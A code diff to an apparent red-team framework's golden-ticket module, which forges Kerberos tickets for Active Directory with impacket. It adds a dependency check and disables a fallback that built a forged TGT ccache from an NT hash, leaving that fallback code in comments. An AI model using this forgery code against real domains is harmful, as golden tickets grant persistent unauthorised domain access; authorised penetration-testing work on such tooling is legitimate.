@@ -15,6 +15,7 @@ import os
 import tempfile
 from typing import Any
 
+from ares.core.errors import ModuleExecutionError, ModuleValidationError
 from ares.core.logger import get_logger, audit
 from ares.core.campaign import Finding, Severity
 from ares.modules.params import GoldenTicketParams
@@ -182,6 +183,16 @@ class GoldenTicketModule(BaseModule[GoldenTicketParams, ModuleResult]):
                 "Expected: S-1-5-21-<sub1>-<sub2>-<sub3>",
                 module_id=self.MODULE_ID, field="domain_sid",
             )
+        try:
+            from impacket.krb5.ticket import Ticket  # noqa: F401
+            from impacket.krb5 import constants  # noqa: F401
+            from impacket.krb5.types import Principal  # noqa: F401
+        except ImportError as e:
+            raise ModuleValidationError(
+                f"credential.golden_ticket requires impacket: {e}. "
+                "Install via: pip install impacket",
+                module_id=self.MODULE_ID,
+            ) from e
         await super().validate(ctx)
 
     async def execute(self, ctx: "Any") -> "ModuleResult":
@@ -404,31 +415,38 @@ class GoldenTicketModule(BaseModule[GoldenTicketParams, ModuleResult]):
                         _shutil.move(default_local, dst)
                         return True, dst, ""
                     return False, "", "Ticket file not created"
-                except (ImportError, AttributeError, TypeError):
-                    pass
+                except (ImportError, AttributeError, TypeError) as ticketer_err:
+                    # MOD-035: Fallback path blocked.
+                    # The previous fallback used CCache.fromKRBCRED() to construct a ticket
+                    # without a valid PAC and KDC signature. Such tickets fail AD Kerberos validation
+                    # and produce false positives. Hard dependency on impacket TICKETER is required.
+                    #
+                    # --- DISABLED FALLBACK CODE (DO NOT RE-ENABLE) ---
+                    # from ares.core.security import secure_mkstemp as _secure_mkstemp
+                    # tmp_path, _fd = _secure_mkstemp(suffix=".ccache", prefix="ares_gt_")
+                    # _os.close(_fd)
+                    # cipher_type = constants.EncryptionTypes.rc4_hmac.value   # 23
+                    # key         = Key(cipher_type, nt_hash)
+                    # cc = CCache()
+                    # cc.fromKRBCRED(
+                    #     cc.toKRBCRED(
+                    #         user_principal,
+                    #         Principal(f"krbtgt/{domain_upper}",
+                    #                   type=constants.PrincipalNameType.NT_SRV_INST.value),
+                    #         domain_upper, key, ticket_session_key=None,
+                    #     )
+                    # )
+                    # cc.saveFile(tmp_path)
+                    # return True, tmp_path, ""
+                    # ------------------------------------------------
+                    raise ModuleExecutionError(
+                        "impacket ticketer unavailable — fallback ticket construction "
+                        "disabled: would produce invalid ticket without PAC/KDC signature. "
+                        "Ensure impacket is properly installed. (MOD-035)"
+                    ) from ticketer_err
 
-                # Fallback: write ccache using raw KRB5 ticket construction
-                from ares.core.security import secure_mkstemp as _secure_mkstemp
-                tmp_path, _fd = _secure_mkstemp(suffix=".ccache", prefix="ares_gt_")
-                _os.close(_fd)
-
-                # Build minimal valid TGT structure
-                cipher_type = constants.EncryptionTypes.rc4_hmac.value   # 23
-                key         = Key(cipher_type, nt_hash)
-
-                # Create ccache with forged TGT credentials entry
-                cc = CCache()
-                cc.fromKRBCRED(
-                    cc.toKRBCRED(
-                        user_principal,
-                        Principal(f"krbtgt/{domain_upper}",
-                                  type=constants.PrincipalNameType.NT_SRV_INST.value),
-                        domain_upper, key, ticket_session_key=None,
-                    )
-                )
-                cc.saveFile(tmp_path)
-                return True, tmp_path, ""
-
+            except ModuleExecutionError:
+                raise
             except Exception as exc:
                 return False, "", str(exc)[:300]
 
